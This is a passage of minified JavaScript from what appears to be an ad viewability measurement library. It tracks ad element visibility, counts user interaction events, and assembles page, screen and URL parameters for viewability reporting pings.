            1 <= a.g.length && (m.i0 = a.g[0].Eb, m.a0 = [a.g[0].Ab], m.c0 = [a.g[0].Z], m.ss0 = [a.g[0].oa], f = a.g[0].position, m.p0 = f ? ro(f) : void 0);
            2 <= a.g.length && (m.i1 = a.g[1].Eb,
                m.a1 = Io(a.g[1].cc, a.g[1].Ab, a.g[1].Zb), m.c1 = Io(a.g[1].dc, a.g[1].Z, a.g[1].$b), m.ss1 = Io(a.g[1].ec, a.g[1].oa, a.g[1].ac), f = a.g[1].position, m.p1 = f ? ro(f) : void 0, m.mtos1 = a.g[1].fc);
            3 <= a.g.length && (m.i2 = a.g[2].Eb, m.a2 = Io(a.g[2].cc, a.g[2].Ab, a.g[2].Zb), m.c2 = Io(a.g[2].dc, a.g[2].Z, a.g[2].$b), m.ss2 = Io(a.g[2].ec, a.g[2].oa, a.g[2].ac), f = a.g[2].position, m.p2 = f ? ro(f) : void 0, m.mtos2 = a.g[2].fc);
            4 <= a.g.length && (m.i3 = a.g[3].Eb, m.a3 = Io(a.g[3].cc, a.g[3].Ab, a.g[3].Zb), m.c3 = Io(a.g[3].dc, a.g[3].Z, a.g[3].$b), m.ss3 = Io(a.g[3].ec,
                a.g[3].oa, a.g[3].ac), f = a.g[3].position, m.p3 = f ? ro(f) : void 0, m.mtos3 = a.g[3].fc);
            m.cs = go(a.fa);
            b && (m.ic = fo(a.fa), m.dvpt = k.l.h, m.dvs = Dn(k.h, .5), m.dfvs = Dn(k.h, 1), m.davs = Dn(k.g, .5), m.dafvs = Dn(k.g, 1), c && (k.l.h = 0, En(k.h), En(k.g)), a.ab() && (m.dtos = k.K, m.dav = k.D, m.dtoss = a.yc + 1, c && (k.K = 0, k.D = 0, a.yc++)), m.dat = k.B.h, m.dft = k.G.h, c && (k.B.h = 0, k.G.h = 0));
            m.ps = [g.o.width, g.o.height];
            m.bs = [g.g.getWidth(), g.g.getHeight()];
            m.scs = [g.B.width, g.B.height];
            m.dom = g.domain;
            a.wb && (m.vds = a.wb);
            if (0 < a.A.length || a.bb) b = Bb(a.A), a.bb &&
                b.push(a.bb), m.pings = qb(b, function(v) {
                    return v.toString()
                });
            b = qb(pb(a.A, function(v) {
                return v.B()
            }), function(v) {
                return v.getId()
            });
            Cb(b);
            m.ces = b;
            a.h && (m.vmer = a.h);
            a.C && (m.vmmk = a.C);
            a.M && (m.vmiec = a.M);
            m.avms = a.ba ? a.ba.getName() : "ns";
            a.ba && Xb(m, a.ba.Ma());
            d ? (m.c = Dm(a.na.Z, 2), m.ss = Dm(a.na.oa, 2)) : m.tth = pm() - mm;
            m.mc = Dm(k.H, 2);
            m.nc = Dm(k.C, 2);
            m.mv = vo(k.A);
            m.nv = vo(k.o);
            m.lte = Dm(a.Ic, 2);
            d = yo(a, e);
            In(k);
            m.qmtos = In(d);
            m.qnc = Dm(d.C, 2);
            m.qmv = vo(d.A);
            m.qnv = vo(d.o);
            m.qas = 0 < d.o ? 1 : 0;
            m.qi = a.ia;
            m.avms || (m.avms = "geo");
            m.psm = k.R.h;
            m.psv = k.R.g;
            m.psfv = k.Y.g;
            m.psa = k.X.g;
            h = yl(h.U);
            h.length && (m.veid = h);
            a.o && Xb(m, $n(a.o));
            return m
        },
        Fo = function(a, b) {
            if (wb(wm, b)) return !0;
            var c = a.ga[b];
            return void 0 !== c ? (a.ga[b] = !0, !c) : !1
        };
    var Jo = Ya(),
        Mo = function() {
            this.g = {};
            var a = E();
            Ko(this, a, document);
            var b = Lo();
            try {
                if ("1" == b) {
                    for (var c = a.parent; c != a.top; c = c.parent) Ko(this, c, c.document);
                    Ko(this, a.top, a.top.document)
                }
            } catch (d) {}
        },
        Lo = function() {
            var a = document.documentElement;
            try {
                if (!Kf(E().top)) return "2";
                var b = [],
                    c = E(a.ownerDocument);
                for (a = c; a != c.top; a = a.parent)
                    if (a.frameElement) b.push(a.frameElement);
                    else break;
                return b && 0 != b.length ? "1" : "0"
            } catch (d) {
                return "2"
            }
        },
        Ko = function(a, b, c) {
            Bm(c, "mousedown", function() {
                return No(a)
            }, 301);
            Bm(b,
                "scroll",
                function() {
                    return Oo(a)
                }, 302);
            Bm(c, "touchmove", function() {
                return Po(a)
            }, 303);
            Bm(c, "mousemove", function() {
                return Qo(a)
            }, 304);
            Bm(c, "keydown", function() {
                return Ro(a)
            }, 305)
        },
        No = function(a) {
            Gb(a.g, function(b) {
                1E5 < b.l || ++b.l
            })
        },
        Oo = function(a) {
            Gb(a.g, function(b) {
                1E5 < b.g || ++b.g
            })
        },
        Po = function(a) {
            Gb(a.g, function(b) {
                1E5 < b.g || ++b.g
            })
        },
        Ro = function(a) {
            Gb(a.g, function(b) {
                1E5 < b.h || ++b.h
            })
        },
        Qo = function(a) {
            Gb(a.g, function(b) {
                1E5 < b.o || ++b.o
            })
        };
    var So = function() {
            this.g = [];
            this.h = []
        },
        To = function(a, b) {
            return tb(a.g, function(c) {
                return c.ia == b
            })
        },
        Uo = function(a, b) {
            return b ? tb(a.g, function(c) {
                return c.pa.Sa == b
            }) : null
        },
        Vo = function(a, b) {
            return tb(a.h, function(c) {
                return 2 == c.va() && c.ia == b
            })
        },
        Xo = function() {
            var a = Wo;
            return 0 == a.g.length ? a.h : 0 == a.h.length ? a.g : Ab(a.h, a.g)
        };
    So.prototype.reset = function() {
        this.g = [];
        this.h = []
    };
    var Yo = function(a, b) {
            a = 1 == b.va() ? a.g : a.h;
            var c = ub(a, function(d) {
                return d == b
            });
            return -1 != c ? (a.splice(c, 1), b.ba && b.ba.Kb(), b.W(), !0) : !1
        },
        Zo = function(a) {
            var b = Wo;
            if (Yo(b, a)) {
                switch (a.va()) {
                    case 0:
                        var c = function() {
                            return null
                        };
                    case 2:
                        c = function() {
                            return Vo(b, a.ia)
                        };
                        break;
                    case 1:
                        c = function() {
                            return To(b, a.ia)
                        }
                }
                for (var d = c(); d; d = c()) Yo(b, d)
            }
        },
        $o = function(a) {
            var b = Wo;
            a = pb(a, function(c) {
                return !Uo(b, c.pa.Sa)
            });
            b.g.push.apply(b.g, ha(a))
        },
        ap = function(a) {
            var b = Wo,
                c = [];
            z(a, function(d) {
                sb(b.g, function(e) {
                    return e.pa.Sa ===
                        d.pa.Sa && e.ia === d.ia
                }) || (b.g.push(d), c.push(d))
            })
        },
        Wo = G(So);
    var bp = function() {
            this.g = this.h = null
        },
        cp = function(a, b) {
            if (null == a.h) return !1;
            var c = function(d, e) {
                b(d, e)
            };
            a.g = tb(a.h, function(d) {
                return null != d && d.ed()
            });
            a.g && (a.g.init(c) ? Zm(a.g.g) : b(a.g.g.qb(), a.g));
            return null != a.g
        };
    var ep = function(a) {
        a = dp(a);
        dn.call(this, a.length ? a[a.length - 1] : new Vm(D, 0));
        this.l = a;
        this.h = null
    };
    t(ep, dn);
    l = ep.prototype;
    l.getName = function() {
        return (this.h ? this.h : this.g).getName()
    };
    l.Ma = function() {
        return (this.h ? this.h : this.g).Ma()
    };
    l.Ga = function() {
        return (this.h ? this.h : this.g).Ga()
    };
    l.init = function(a) {
        var b = !1;
        z(this.l, function(c) {
            c.initialize() && (b = !0)
        });
        b && (this.o = a, Ym(this.g, this));
        return b
    };
    l.W = function() {
        z(this.l, function(a) {
            a.W()
        });
        dn.prototype.W.call(this)
    };
    l.ed = function() {
        return sb(this.l, function(a) {
            return a.D()
        })
    };
    l.zb = function() {
        return sb(this.l, function(a) {
            return a.D()
        })
    };
    l.Lb = function(a, b, c) {
        return new oo(a, this.g, b, c)
    };
    l.Pa = function(a) {
        this.h = a.h
    };
    var dp = function(a) {
        if (!a.length) return [];
        a = pb(a, function(c) {
            return null != c && c.D()
        });
        for (var b = 1; b < a.length; b++) Ym(a[b - 1], a[b]);
        return a
    };
    var fp = {
            threshold: [0, .3, .5, .75, 1]
        },
        gp = function(a, b, c, d) {
            cn.call(this, a, b, c, d);
            this.D = this.L = this.C = this.B = this.o = null
        };
    t(gp, oo);
    gp.prototype.rc = function() {
        var a = this;
        this.D || (this.D = pm());
        if (gm(298, function() {
                return hp(a)
            })) return !0;
        Xm(this.h, "msf");
        return !1
    };
    gp.prototype.Kb = function() {
        if (this.o && this.l) try {
            this.o.unobserve(this.l), this.B ? (this.B.unobserve(this.l), this.B = null) : this.C && (this.C.disconnect(), this.C = null)
        } catch (a) {}
    };
    var ip = function(a) {
            return a.o && a.o.takeRecords ? a.o.takeRecords() : []
        },
        hp = function(a) {
            if (!a.l) return !1;
            var b = a.l,
                c = a.h.g.ka,
                d = N().g.g;
            a.o = new c.IntersectionObserver(Sl(d, function(e) {
                return jp(a, e)
            }), fp);
            d = Sl(d, function() {
                a.o.unobserve(b);
                a.o.observe(b);
                jp(a, ip(a))
            });
            c.ResizeObserver ? (a.B = new c.ResizeObserver(d), a.B.observe(b)) : c.MutationObserver && (a.C = new u.MutationObserver(d), a.C.observe(b, {
                attributes: !0,
                childList: !0,
                characterData: !0,
                subtree: !0
            }));
            a.o.observe(b);
            jp(a, ip(a));
            return !0
        },
        jp = function(a,
            b) {
            try {
                if (b.length) {
                    a.L || (a.L = pm());
                    var c = kp(b),
                        d = ng(a.l, a.h.g.ka),
                        e = d.x,
                        f = d.y;
                    a.g = new F(Math.round(f), Math.round(e) + c.boundingClientRect.width, Math.round(f) + c.boundingClientRect.height, Math.round(e));
                    var g = Im(c.intersectionRect);
                    a.A = Yf(g, a.g.left - g.left, a.g.top - g.top)
                }
            } catch (h) {
                a.Kb(), im(299, h)
            }
        },
        kp = function(a) {
            return rb(a, function(b, c) {
                return b.time > c.time ? b : c
            }, a[0])
        };
    l = gp.prototype;
    l.La = function() {
        var a = ip(this);
        0 < a.length && jp(this, a);
        oo.prototype.La.call(this)
    };
    l.vc = function() {};
    l.Cd = function() {
        return !1
    };
    l.od = function() {};
    l.Ma = function() {
        var a = {};
        return Object.assign(this.h.Ma(), (a.niot_obs = this.D, a.niot_cbk = this.L, a))
    };
    l.getName = function() {
        return "nio"
    };
    var lp = function(a) {
        a = void 0 === a ? D : a;
        dn.call(this, new Vm(a, 2))
    };
    t(lp, dn);
    lp.prototype.getName = function() {
        return "nio"
    };
    lp.prototype.zb = function() {
        return !O().h && null != this.g.g.ka.IntersectionObserver
    };
    lp.prototype.Lb = function(a, b, c) {
        return new gp(a, this.g, b, c)
    };
    var np = function() {
        var a = mp();
        Vm.call(this, D.top, a, "geo")
    };
    t(np, Vm);
    np.prototype.Y = function() {
        return O().g
    };
    np.prototype.D = function() {
        var a = mp();
        this.I !== a && (this.g != this && a > this.g.I && (this.g = this, Wm(this)), this.I = a);
        return 2 == a
    };
    var mp = function() {
        N();
        var a = O();
        return a.l || a.h ? 0 : 2
    };
    var op = function() {};
    var pp = function() {
            this.done = !1;
            this.g = {
                oe: 0,
                ld: 0,
                yh: 0,
                ud: 0,
                Ec: -1,
                we: 0,
                ve: 0,
                xe: 0
            };
            this.B = null;
            this.A = !1;
            this.l = null;
            this.C = 0;
            this.h = new Tm(this)
        },
        sp = function() {
            var a = qp;
            a.A || (a.A = !0, rp(a, function(b) {
                for (var c = [], d = 0; d < arguments.length; ++d) c[d - 0] = arguments[d];
                return a.o.apply(a, ha(c))
            }), a.o())
        };
    pp.prototype.sample = function() {
        tp(this, Xo(), !1)
    };
    var up = function() {
            G(op);
            var a = G(bp);
            null != a.g && a.g.g ? Zm(a.g.g) : Om(O())
        },
        tp = function(a, b, c) {
            if (!a.done && (a.h.cancel(), 0 != b.length)) {
                a.l = null;
                try {
                    up();
                    var d = pm(),
                        e = N();
                    e.A = d;
                    if (null != G(bp).g)
                        for (e = 0; e < b.length; e++) Un(b[e], d, c);
                    else Yl($l, "", {
                        strategy_not_selected: 1,
                        bin: e.h
                    }, !0, void 0);
                    for (d = 0; d < b.length; d++) Vn(b[d]);
                    ++a.g.ud;
                    N()
                } finally {
                    c ? z(b, function(f) {
                        f.na.Z = 0
                    }) : Um(a.h)
                }
            }
        },
        rp = function(a, b) {
            if (!a.B) {
                b = hm(142, b);
                Ll();
                var c = jh(Qe);
                c && ff(Qe, c, b, {
                    capture: !1
                }) && (a.B = b)
            }
        };
    pp.prototype.o = function() {
        var a = Sm(),
            b = pm();
        a ? (om || (km = b, z(Wo.g, function(c) {
            var d = c.ra();
            d.T = ko(d, b, 1 != c.ea)
        })), om = !0) : (this.C = vp(this, b), om = !1, mm = b, z(Wo.g, function(c) {
            c.Ub && (c.ra().I = b)
        }));
        tp(this, Xo(), !a)
    };
    var wp = function() {
            var a = G(bp);
            if (null != a.g) {
                var b = a.g;
                z(Xo(), function(c) {
                    return Sn(c, b)
                })
            }
        },
        vp = function(a, b) {
            a = a.C;
            om && (a += b - km);
            return a
        },
        xp = function(a) {
            var b = qp;
            a = void 0 === a ? function() {
                return {}
            } : a;
            dm.Sc("av-js");
            $l.g = .01;
            fm([function(c) {
                var d = N(),
                    e = {};
                e = (e.bin = d.h, e.type = "error", e);
                d = xl(d.U);
                if (!b.l) {
                    var f = D.document,
                        g = 0 <= lm ? pm() - lm : -1,
                        h = pm(); - 1 == b.g.Ec && (g = h);
                    var k = O(),
                        n = N(),
                        m = xl(n.U),
                        v = Xo();
                    try {
                        if (0 < v.length) {
                            var r = k.g;
                            r && (m.bs = [r.getWidth(), r.getHeight()]);
                            var w = k.o;
                            w && (m.ps = [w.width, w.height]);
                            D.screen && (m.scs = [D.screen.width, D.screen.height])
                        } else m.url = encodeURIComponent(D.location.href.substring(0, 512)), f.referrer && (m.referrer = encodeURIComponent(f.referrer.substring(0, 512)));
                        m.tt = g;
                        m.pt = lm;
                        m.bin = n.h;
                        void 0 !== D.google_osd_load_pub_page_exp && (m.olpp = D.google_osd_load_pub_page_exp);
                        m.deb = [1, b.g.oe, b.g.ld, b.g.ud, b.g.Ec, 0, b.h.h, b.g.we, b.g.ve, b.g.xe].join("-");
                        m.tvt = vp(b, h);
                        k.h && (m.inapp = 1);
                        if (null !== D && D != D.top) {
                            0 < v.length && (m.iframe_loc = encodeURIComponent(D.location.href.substring(0, 512)));
                            var x = k.I;
                            m.is = [x.getWidth(), x.getHeight()]
                        }
                    } catch (ka) {
                        m.error = 1
                    }
                    b.l = m
                }
                w = b.l;
                r = {};
                for (var H in w) r[H] = w[H];
                H = N().g;
                if (1 == wl(H.l, "prf")) {
                    w = new Ql;
                    x = H.g;
                    f = 0; - 1 < x.g && (f = x.l.g.now() - x.g);
                    w = Ge(w, 1, x.o + f, 0);
                    x = H.g;
                    w = Ge(w, 5, -1 < x.g ? x.h + 1 : x.h, 0);
                    w = Ge(w, 2, H.h.g.l(), 0);
                    w = Ge(w, 3, H.h.g.h(), 0);
                    w = Ge(w, 4, H.h.g.g(), 0);
                    H = {};
                    x = new ce;
                    g = C(w, 1);
                    if (null != g) {
                        md(x.g, 9);
                        f = x.g;
                        k = g;
                        k = (g = 0 > k ? 1 : 0) ? -k : k;
                        if (0 === k) id = 0 < 1 / k ? 0 : 2147483648, hd = 0;
                        else if (isNaN(k)) id = 2147483647, hd = 4294967295;
                        else if (1.7976931348623157E308 < k) id = (g << 31 | 2146435072) >>>
                            0, hd = 0;
                        else if (2.2250738585072014E-308 > k) h = k / Math.pow(2, -1074), id = (g << 31 | h / 4294967296) >>> 0, hd = h >>> 0;
                        else {
                            n = k;
                            h = 0;
                            if (2 <= n)
                                for (; 2 <= n && 1023 > h;) h++, n /= 2;
                            else
                                for (; 1 > n && -1022 < h;) n *= 2, h--;
                            k *= Math.pow(2, -h);
                            id = (g << 31 | h + 1023 << 20 | 1048576 * k & 1048575) >>> 0;
                            hd = 4503599627370496 * k >>> 0
                        }
                        nd(f, hd);
                        nd(f, id)
                    }
                    je(x, 2, C(w, 2));
                    je(x, 3, C(w, 3));
                    je(x, 4, C(w, 4));
                    ie(x, 5, C(w, 5));
                    Pe(w, x);
                    w = he(x);
                    H = (H.pf = Zd(w), H)
                } else H = {};
                Xb(r, H);
                Xb(c, e, d, r, a());
                if (e = pn()) d = {}, Xb(c, (d.v = encodeURIComponent(e), d))
            }])
        },
        qp = G(pp);
    var yp = null,
        zp = "",
        Ap = !1,
        Bp = function() {
            var a = yp || D;
            if (!a) return "";
            var b = [];
            if (!a.location || !a.location.href) return "";
            b.push("url=" + encodeURIComponent(a.location.href.substring(0, 512)));
            a.document && a.document.referrer && b.push("referrer=" + encodeURIComponent(a.document.referrer.substring(0, 512)));
            return b.join("&")
        };
    var Cp = function(a) {
            return function(b) {
                return void 0 === b[a] ? 0 : b[a]
            }
        },
        Ep = function() {
            var a = [0, 2, 4];
            return function(b) {
                b = b.tos;
                if (Array.isArray(b)) {
                    for (var c = Array(b.length), d = 0; d < b.length; d++) c[d] = 0 < d ? c[d - 1] + b[d] : b[d];
                    return void 0 !== a ? Dp(c, a) : c
                }
            }
        },
        Fp = function(a, b, c, d) {
            c = void 0 === c ? !0 : c;
            d = void 0 === d ? function() {
                return !0
            } : d;
            return function(e) {
                var f = e[a];
                if (Array.isArray(f) && d(e)) return Dp(f, b, c)
            }
        },
        Gp = function(a, b) {
            return function(c) {
                return b(c) ? c[a] : void 0
            }
        },
        Hp = function(a) {
            return function(b) {
                for (var c =
                        0; c < a.length; c++)
                    if (a[c] === b.e || void 0 === a[c] && !b.hasOwnProperty("e")) return !0;
                return !1
            }
        },
        Dp = function(a, b, c) {
            return void 0 === c || c ? pb(a, function(d, e) {
                return wb(b, e)
            }) : qb(b, function(d, e, f) {
                return a.slice(0 < e ? f[e - 1] + 1 : 0, d + 1).reduce(function(g, h) {
                    return g + h
                }, 0)
            })
        };
    var Ip = Hp([void 0, 1, 2, 3, 4, 8, 16]),
        Jp = Hp([void 0, 4, 8, 16]),
        Kp = {
            sv: "sv",
            cb: "cb",
            e: "e",
            nas: "nas",
            msg: "msg",
            "if": "if",
            sdk: "sdk",
            p: "p",
            p0: Gp("p0", Jp),
            p1: Gp("p1", Jp),
            p2: Gp("p2", Jp),
            p3: Gp("p3", Jp),
            cp: "cp",
            tos: "tos",
            mtos: "mtos",
            amtos: "amtos",
            mtos1: Fp("mtos1", [0, 2, 4], !1, Jp),
            mtos2: Fp("mtos2", [0, 2, 4], !1, Jp),
            mtos3: Fp("mtos3", [0, 2, 4], !1, Jp),
            mcvt: "mcvt",
            ps: "ps",
            scs: "scs",
            bs: "bs",
            vht: "vht",
            mut: "mut",
            a: "a",
            a0: Gp("a0", Jp),
            a1: Gp("a1", Jp),
            a2: Gp("a2", Jp),
            a3: Gp("a3", Jp),
            ft: "ft",
            dft: "dft",
            at: "at",
            dat: "dat",
            as: "as",
            vpt: "vpt",
            gmm: "gmm",
            std: "std",
            efpf: "efpf",
            swf: "swf",
            nio: "nio",
            px: "px",
            nnut: "nnut",
            vmer: "vmer",
            vmmk: "vmmk",
            vmiec: "vmiec",
            nmt: "nmt",
            tcm: "tcm",
            bt: "bt",
            pst: "pst",
            vpaid: "vpaid",
            dur: "dur",
            vmtime: "vmtime",
            dtos: "dtos",
            dtoss: "dtoss",
            dvs: "dvs",
            dfvs: "dfvs",
            dvpt: "dvpt",
            fmf: "fmf",
            vds: "vds",
            is: "is",
            i0: "i0",
            i1: "i1",
            i2: "i2",
            i3: "i3",
            ic: "ic",
            cs: "cs",
            c: "c",
            c0: Gp("c0", Jp),
            c1: Gp("c1", Jp),
            c2: Gp("c2", Jp),
            c3: Gp("c3", Jp),
            mc: "mc",
            nc: "nc",
            mv: "mv",
            nv: "nv",
            qmt: Gp("qmtos", Ip),
            qnc: Gp("qnc", Ip),
            qmv: Gp("qmv", Ip),
            qnv: Gp("qnv", Ip),
            raf: "raf",
            rafc: "rafc",
            lte: "lte",
            ces: "ces",
            tth: "tth",
            femt: "femt",
            femvt: "femvt",
            emc: "emc",
            emuc: "emuc",
            emb: "emb",
            avms: "avms",
            nvat: "nvat",
            qi: "qi",
            psm: "psm",
            psv: "psv",
            psfv: "psfv",
            psa: "psa",
            pnk: "pnk",
            pnc: "pnc",
            pnmm: "pnmm",
            pns: "pns",
            ptlt: "ptlt",
            pngs: "pings",
            veid: "veid",
            ssb: "ssb",
            ss0: Gp("ss0", Jp),
            ss1: Gp("ss1", Jp),
            ss2: Gp("ss2", Jp),
            ss3: Gp("ss3", Jp),
            dc_rfl: "urlsigs",
            obd: "obd",
            omidp: "omidp",
            omidr: "omidr",
            omidv: "omidv",
            omida: "omida",
            omids: "omids",
            omidpv: "omidpv",
            omidam: "omidam",
            omidct: "omidct",
            omidia: "omidia"
        },
        Lp = {
            c: Cp("c"),
            at: "at",
            atos: Fp("atos", [0, 2, 4]),
            ta: function(a, b) {
                return function(c) {
                    if (void 0 === c[a]) return b
                }
            }("tth", "1"),
            a: "a",
            dur: "dur",
            p: "p",
            tos: Ep(),
            j: "dom",
            mtos: Fp("mtos", [0, 2, 4]),
            gmm: "gmm",
            gdr: "gdr",
            ss: Cp("ss"),
            vsv: ib("w2"),
            t: "t"
        },
        Mp = {
            atos: "atos",
            avt: Fp("atos", [2]),
            davs: "davs",
            dafvs: "dafvs",
            dav: "dav",
            ss: Cp("ss"),
            t: "t"
        },
        Np = {
            a: "a",
            tos: Ep(),
            at: "at",
            c: Cp("c"),
            mtos: Fp("mtos", [0, 2, 4]),
            dur: "dur",
            fs: "fs",
            p: "p",
            vpt: "vpt",
            vsv: ib("ias_w2"),
            dom: "dom",
            gmm: "gmm",
            gdr: "gdr",
            t: "t"
        },
        Op = {
            tos: Ep(),
            at: "at",
            c: Cp("c"),
            mtos: Fp("mtos", [0, 2, 4]),
            p: "p",
            vpt: "vpt",
            vsv: ib("dv_w4"),
            gmm: "gmm",
            gdr: "gdr",
            dom: "dom",
            t: "t",
            mv: "mv",
            qmpt: Fp("qmtos", [0, 2, 4]),
            qvs: function(a, b) {
                return function(c) {
                    var d = c[a];
                    if ("number" === typeof d) return qb(b, function(e) {
                        return 0 < d && d >= e ? 1 : 0
                    })
                }
            }("qnc", [1, .5, 0]),
            qmv: "qmv",
            qa: "qas",
            a: "a"
        };

    function Pp() {
        var a = "av.default_js_unreleased_RCxx".match(/_(\d{8})_RC\d+$/) || "av.default_js_unreleased_RCxx".match(/_(\d{8})_\d+_\d+$/) || "av.default_js_unreleased_RCxx".match(/_(\d{8})_\d+\.\d+$/) || "av.default_js_unreleased_RCxx".match(/_(\d{8})_\d+_RC\d+$/),
            b;
        if (2 == (null == (b = a) ? void 0 : b.length)) return a[1];
        a = "av.default_js_unreleased_RCxx".match(/.*_(\d{2})\.(\d{4})\.\d+_RC\d+$/);
        var c;
        return 3 == (null == (c = a) ? void 0 : c.length) ? "20" + a[1] + a[2] : "903"
    }
    var Qp = function() {
            return "ima_html5_sdk".includes("ima_html5_sdk") ? {
                Aa: "ima",
                version: "903"
            } : "ima_html5_sdk".includes("ima_native_sdk") ? {
                Aa: "nima",
                version: "903"
            } : "ima_html5_sdk".includes("admob-native-video-javascript") ? {
                Aa: "an",
                version: "903"
            } : "av.default_js_unreleased_RCxx".includes("cast_js_sdk") ? {
                Aa: "cast",
                version: Pp()
            } : "av.default_js_unreleased_RCxx".includes("youtube.player.web") ? {
                Aa: "yw",
                version: Pp()
            } : "av.default_js_unreleased_RCxx".includes("outstream_web_client") ? {
                Aa: "out",
                version: Pp()
            } : "av.default_js_unreleased_RCxx".includes("drx_rewarded_web") ? {
                Aa: "r",
                version: Pp()
            } : "av.default_js_unreleased_RCxx".includes("gam_native_web_video") ? {
                Aa: "n",
                version: Pp()
            } : "av.default_js_unreleased_RCxx".includes("admob_interstitial_video") ? {
                Aa: "int",
                version: Pp()
            } : {
                Aa: "j",
                version: "903"
            }
        },
        Rp = Qp().Aa,
        Sp = Qp().version;
    var Up = function(a, b) {
            var c = {
                sv: Sp,
                cb: Rp
            };
            c.nas = Wo.g.length;
            c.msg = a;
            void 0 !== b && (a = Tp(b)) && (c.e = xm[a]);
            return c
        },
        Vp = function(a) {
            return 0 == a.lastIndexOf("custom_metric_viewable", 0)
        },
        Tp = function(a) {
            var b = Vp(a) ? "custom_metric_viewable" : a.toLowerCase();
            return Rb(function(c) {
                return c == b
            })
        };
    var Wp = {
            Uf: "visible",
            Bf: "audible",
            ah: "time",
            eh: "timetype"
        },
        Xp = {
            visible: function(a) {
                return /^(100|[0-9]{1,2})$/.test(a)
            },
            audible: function(a) {
                return "0" == a || "1" == a
            },
            timetype: function(a) {
                return "mtos" == a || "tos" == a
            },
            time: function(a) {
                return /^(100|[0-9]{1,2})%$/.test(a) || /^([0-9])+ms$/.test(a)
            }
        },
        Yp = function() {
            this.g = void 0;
            this.h = !1;
            this.l = 0;
            this.o = -1;
            this.B = "tos"
        },
        Zp = function(a) {
            try {
                var b = a.split(",");
                return b.length > Nb(Wp).length ? null : rb(b, function(c, d) {
                    d = d.toLowerCase().split("=");
                    if (2 != d.length || void 0 ===
                        Xp[d[0]] || !Xp[d[0]](d[1])) throw Error("Entry (" + d[0] + ", " + d[1] + ") is invalid.");
                    c[d[0]] = d[1];
                    return c
                }, {})
            } catch (c) {
                return null
            }
        },
        $p = function(a, b) {
            if (void 0 == a.g) return 0;
            switch (a.B) {
                case "mtos":
                    return a.h ? Cn(b.g, a.g) : Cn(b.h, a.g);
                case "tos":
                    return a.h ? An(b.g, a.g) : An(b.h, a.g)
            }
            return 0
        };
    var aq = function(a, b, c, d) {
        mo.call(this, b, d);
        this.A = a;
        this.C = c
    };
    t(aq, mo);
    aq.prototype.getId = function() {
        return this.A
    };
    aq.prototype.B = function() {
        return !0
    };
    aq.prototype.o = function(a) {
        var b = a.ra(),
            c = a.getDuration();
        return sb(this.C, function(d) {
            if (void 0 != d.g) var e = $p(d, b);
            else b: {
                switch (d.B) {
                    case "mtos":
                        e = d.h ? b.B.l : b.l.g;
                        break b;
                    case "tos":
                        e = d.h ? b.B.g : b.l.g;
                        break b
                }
                e = 0
            }
            0 == e ? d = !1 : (d = -1 != d.l ? d.l : void 0 !== c && 0 < c ? d.o * c : -1, d = -1 != d && e >= d);
            return d
        })
    };
    var bq = function(a) {
        mo.call(this, "fully_viewable_audible_half_duration_impression", a)
    };
    t(bq, mo);
    bq.prototype.o = function(a) {
        var b = An(a.ra().g, 1);
        return zo(a, b)
    };
    var cq = function(a, b) {
        mo.call(this, a, b)
    };
    t(cq, mo);
    cq.prototype.o = function(a) {
        return a.ra().ab()
    };
    var dq = function() {
        this.h = this.o = this.A = this.B = this.l = this.g = ""
    };
    var eq = function() {},
        fq = function(a, b, c, d, e) {
            var f = {};
            if (void 0 !== a)
                if (null != b)
                    for (var g in b) {
                        var h = b[g];
                        g in Object.prototype || null != h && (f[g] = "function" === typeof h ? h(a) : a[h])
                    } else Xb(f, a);
            void 0 !== c && Xb(f, c);
            a = mn(kn(new hn, f));
            0 < a.length && void 0 !== d && void 0 !== e && (e = e(a), a += "&" + d + "=" + e);
            return a
        };
    var gq = function() {};
    t(gq, eq);
    gq.prototype.g = function(a) {
        var b = new dq;
        b.g = fq(a, Kp);
        b.l = fq(a, Mp);
        return b
    };
    var hq = function(a, b, c) {
        qo.call(this, a, b, c)
    };
    t(hq, qo);
    hq.prototype.o = function() {
        var a = Ka("ima.admob.getViewability"),
            b = wl(this.U, "queryid");
        "function" === typeof a && b && a(b)
    };
    hq.prototype.getName = function() {
        return "gsv"
    };
    var iq = function(a) {
        a = void 0 === a ? D : a;
        dn.call(this, new Vm(a, 2))
    };
    t(iq, dn);
    iq.prototype.getName = function() {
        return "gsv"
    };
    iq.prototype.zb = function() {
        var a = O();
        N();
        return a.h && !1
    };
    iq.prototype.Lb = function(a, b, c) {
        return new hq(this.g, b, c)
    };
    var jq = function(a, b, c) {
        qo.call(this, a, b, c)
    };
    t(jq, qo);
    jq.prototype.o = function() {
        var a = this,
            b = Ka("ima.bridge.getNativeViewability"),
            c = wl(this.U, "queryid");
        "function" === typeof b && c && b(c, function(d) {
            Tb(d) && a.B++;
            var e = d.opt_nativeViewVisibleBounds || {},
                f = d.opt_nativeViewHidden;
            a.g = Jm(d.opt_nativeViewBounds || {});
            var g = a.h.l;
            g.g = f ? Xf(po) : Jm(e);
            a.timestamp = d.opt_nativeTime || -1;
            O().g = g.g;
            d = d.opt_nativeVolume;
            void 0 !== d && (g.volume = d)
        })
    };
    jq.prototype.getName = function() {
        return "nis"
    };
    var kq = function(a) {
        a = void 0 === a ? D : a;
        dn.call(this, new Vm(a, 2))
    };
    t(kq, dn);
    kq.prototype.getName = function() {
        return "nis"
    };
    kq.prototype.zb = function() {
        var a = O();
        N();
        return a.h && !1
    };
    kq.prototype.Lb = function(a, b, c) {
        return new jq(this.g, b, c)
    };
    var lq = function() {
        Vm.call(this, D, 2, "mraid");
        this.$ = 0;
        this.J = this.K = !1;
        this.C = null;
        this.h = ym(this.ka);
        this.l.g = new F(0, 0, 0, 0);
        this.aa = !1
    };
    t(lq, Vm);
    lq.prototype.D = function() {
        return null != this.h.ya
    };
    lq.prototype.X = function() {
        var a = {};
        this.$ && (a.mraid = this.$);
        this.K && (a.mlc = 1);
        a.mtop = this.h.mf;
        this.C && (a.mse = this.C);
        this.aa && (a.msc = 1);
        a.mcp = this.h.Tb;
        return a
    };
    lq.prototype.A = function(a, b) {
        for (var c = [], d = 1; d < arguments.length; ++d) c[d - 1] = arguments[d];
        try {
            return this.h.ya[a].apply(this.h.ya, c)
        } catch (e) {
            im(538, e, .01, function(f) {
                f.method = a
            })
        }
    };
    var mq = function(a, b, c) {
        a.A("addEventListener", b, c)
    };
    lq.prototype.initialize = function() {
        var a = this;
        if (this.G) return !this.Db();
        this.G = !0;
        if (2 === this.h.Tb) return this.C = "ng", Xm(this, "w"), !1;
        if (1 === this.h.Tb) return this.C = "mm", Xm(this, "w"), !1;
        O().D = !0;
        this.ka.document.readyState && "complete" == this.ka.document.readyState ? nq(this) : Bm(this.ka, "load", function() {
